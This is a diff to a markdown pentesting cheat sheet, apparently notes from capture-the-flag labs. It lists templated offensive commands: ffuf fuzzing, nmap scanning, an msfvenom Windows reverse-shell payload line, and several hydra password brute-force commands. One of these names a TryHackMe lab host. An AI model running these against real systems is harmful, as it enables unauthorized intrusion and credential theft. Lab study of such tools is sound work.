@@ -23,12 +23,6 @@ ffuf -w <WORDLIST> -u http://<IP_ADDRESS>/FUZZ -o <OUTPUT_FILE> --recursion -fc 
 
 ### nmap (Basic network scanning)
 
-- Runs nmap default scripts
-- Scan service versions
-- Outputs file in normal format
-- Disable host discovery
-- Verbose
-
 ```
 nmap -sC -sV --oN <OUTPUT_FILE> -vv -Pn <IP_ADDRESS>
 ```
@@ -45,17 +39,17 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f
 
 ### hydra (brute forcing)
 ```
-hydra -t -V -l <USERNAME> -P <PASSWORD_LIST> <SERVICE>://<IP_ADDRESS> 
+hydra -S -v -l <USERNAME> -P <PASSWORD> -s 995 -f <IP_ADDRESS> <SERVICE> -V
 ```
 
 ### hydra (http-post-form)
 ```
-hydra -t -V -l <USERNAME> -P <PASSWORD_LIST> http-post-form <IP_ADDRESS> "<DIRECTORY> : <RAW_POST_REQUEST> <ERROR_MESSAGE>"
+hydra -t 4 -V -l <USERNAME> -P <PASSWORD_LIST> http-post-form <IP_ADDRESS> "<DIRECTORY> : <RAW_POST_REQUEST> <ERROR_MESSAGE>"
 ```
 
 ### hydra (pop up login page)
 ```
-hydra -L usernames.txt -p Changeme123  ntlmauth.za.tryhackme.com http-get / -V
+hydra -l usernames.txt -P <PASSWORD> <IP_ADDRESS> http-get / -V
 ```
 
 ### Immunity Debugger (Finding bad characters)
